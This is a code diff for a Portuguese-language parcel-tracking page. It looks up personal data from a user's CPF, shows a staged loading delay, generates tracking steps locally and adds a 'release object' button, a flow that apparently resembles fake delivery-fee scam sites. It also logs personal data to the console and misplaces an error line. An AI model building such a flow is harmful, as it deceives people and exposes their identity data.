@@ -38,6 +38,121 @@ export class TrackingSystem {
         }
     }
 
+    showLoadingNotification() {
+        const notificationOverlay = document.createElement('div');
+        notificationOverlay.id = 'trackingNotification';
+        notificationOverlay.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 3000;
+            backdrop-filter: blur(5px);
+            animation: fadeIn 0.3s ease;
+        `;
+
+        const notificationContent = document.createElement('div');
+        notificationContent.style.cssText = `
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: slideUp 0.3s ease;
+            border: 3px solid #ff6b35;
+        `;
+
+        notificationContent.innerHTML = `
+            <div style="margin-bottom: 20px;">
+                <i class="fas fa-search" style="font-size: 3rem; color: #ff6b35; animation: pulse 1.5s infinite;"></i>
+            </div>
+            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
+                Identificando Pedido...
+            </h3>
+            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
+                Aguarde enquanto rastreamos seu pacote
+            </p>
+            <div style="margin-top: 25px;">
+                <div style="width: 100%; height: 4px; background: #e9ecef; border-radius: 2px; overflow: hidden;">
+                    <div style="width: 0%; height: 100%; background: linear-gradient(45deg, #ff6b35, #f7931e); border-radius: 2px; animation: progressBar 5s linear forwards;"></div>
+                </div>
+            </div>
+            <p style="color: #999; font-size: 0.9rem; margin-top: 15px;">
+                Processando informações...
+            </p>
+        `;
+
+        notificationOverlay.appendChild(notificationContent);
+        document.body.appendChild(notificationOverlay);
+        document.body.style.overflow = 'hidden';
+    }
+
+    closeLoadingNotification() {
+        const notification = document.getElementById('trackingNotification');
+        if (notification) {
+            notification.style.animation = 'fadeOut 0.3s ease';
+            setTimeout(() => {
+                if (notification.parentNode) {
+                    notification.remove();
+                }
+                document.body.style.overflow = 'auto';
+            }, 300);
+        }
+    }
+
+    showError(message) {
+        const existingError = document.querySelector('.error-message');
+        if (existingError) {
+            existingError.remove();
+        }
+
+        const errorDiv = document.createElement('div');
+        errorDiv.className = 'error-message';
+        errorDiv.style.cssText = `
+            background: #fee;
+            color: #c33;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+            border: 1px solid #fcc;
+            text-align: center;
+            font-weight: 500;
+            animation: slideDown 0.3s ease;
+        `;
+        errorDiv.textContent = message;
+
+        const form = document.querySelector('.tracking-form');
+        if (form) {
+            form.appendChild(errorDiv);
+
+            setTimeout(() => {
+                if (errorDiv.parentNode) {
+                    errorDiv.style.animation = 'slideUp 0.3s ease';
+                    setTimeout(() => errorDiv.remove(), 300);
+                }
+            }, 5000);
+        }
+    }
+
+    scrollToElement(element, offset = 0) {
+        if (!element) return;
+
+        const elementPosition = element.getBoundingClientRect().top + window.pageYOffset;
+        const offsetPosition = elementPosition - offset;
+
+        window.scrollTo({
+            top: offsetPosition,
+            behavior: 'smooth'
+        });
+    }
+
     setupCPFInput() {
         const cpfInput = document.getElementById('cpfInput');
         if (!cpfInput) return;
@@ -78,16 +193,17 @@ export class TrackingSystem {
         const trackButton = document.getElementById('trackButton');
         
         if (!cpfInput || !trackButton) return;
+            console.error('❌ Elementos do formulário não encontrados');
 
         const cpf = cpfInput.value.trim();
         
         if (!cpf) {
-            UIHelpers.showError('Por favor, digite um CPF');
+            this.showError('Por favor, digite um CPF');
             return;
         }
 
         if (!CPFValidator.isValidCPF(cpf)) {
-            UIHelpers.showError('CPF inválido. Verifique os dados digitados.');
+            this.showError('CPF inválido. Verifique os dados digitados.');
             return;
         }
 
@@ -96,12 +212,13 @@ export class TrackingSystem {
         trackButton.disabled = true;
         trackButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Rastreando...';
 
-        UIHelpers.showLoadingNotification();
+        this.showLoadingNotification();
 
         try {
             console.log('🔍 Buscando dados para CPF:', this.currentCPF);
             
             const data = await this.dataService.fetchCPFData(this.currentCPF);
+            console.log('📊 Dados recebidos:', data);
             
             if (data && data.DADOS) {
                 this.userData = {
@@ -115,7 +232,7 @@ export class TrackingSystem {
                 
                 await new Promise(resolve => setTimeout(resolve, 2000));
                 
-                UIHelpers.closeLoadingNotification();
+                this.closeLoadingNotification();
                 
                 this.displayOrderDetails();
                 this.generateTrackingData();
@@ -123,7 +240,7 @@ export class TrackingSystem {
                 
                 const orderDetails = document.getElementById('orderDetails');
                 if (orderDetails) {
-                    UIHelpers.scrollToElement(orderDetails, 100);
+                    this.scrollToElement(orderDetails, 100);
                 }
 
                 setTimeout(() => {
@@ -136,8 +253,8 @@ export class TrackingSystem {
             
         } catch (error) {
             console.error('❌ Erro no rastreamento:', error);
-            UIHelpers.closeLoadingNotification();
-            UIHelpers.showError('Erro ao buscar dados. Tente novamente.');
+            this.closeLoadingNotification();
+            this.showError('Erro ao buscar dados. Tente novamente.');
         } finally {
             trackButton.disabled = false;
             trackButton.innerHTML = '<i class="fas fa-search"></i> Rastrear Pacote';
@@ -277,13 +394,33 @@ export class TrackingSystem {
             this.setupLiberationButton(liberationButton);
             
             setTimeout(() => {
-                liberationButton.scrollIntoView({ 
-                    behavior: 'smooth', 
-                    block: 'center' 
-                });
+                this.scrollToElement(liberationButton, 100);
             }, 500);
         } else {
             console.warn('⚠️ Botão de liberação não encontrado');
+            console.log('🔍 Tentando criar botão de liberação...');
+            this.createLiberationButtonIfMissing();
+        }
+    }
+
+    createLiberationButtonIfMissing() {
+        // Verificar se já existe um botão na última etapa da timeline
+        const timelineItems = document.querySelectorAll('.timeline-item');
+        const lastTimelineItem = timelineItems[timelineItems.length - 1];
+        
+        if (lastTimelineItem && !lastTimelineItem.querySelector('[data-liberation-button]')) {
+            const timelineText = lastTimelineItem.querySelector('.timeline-text');
+            if (timelineText) {
+                const liberationButton = document.createElement('button');
+                liberationButton.className = 'liberation-button-timeline';
+                liberationButton.setAttribute('data-liberation-button', 'true');
+                liberationButton.innerHTML = '<i class="fas fa-unlock"></i> LIBERAR OBJETO';
+                
+                timelineText.appendChild(liberationButton);
+                this.setupLiberationButton(liberationButton);
+                
+                console.log('✅ Botão de liberação criado automaticamente');
+            }
         }
     }
 
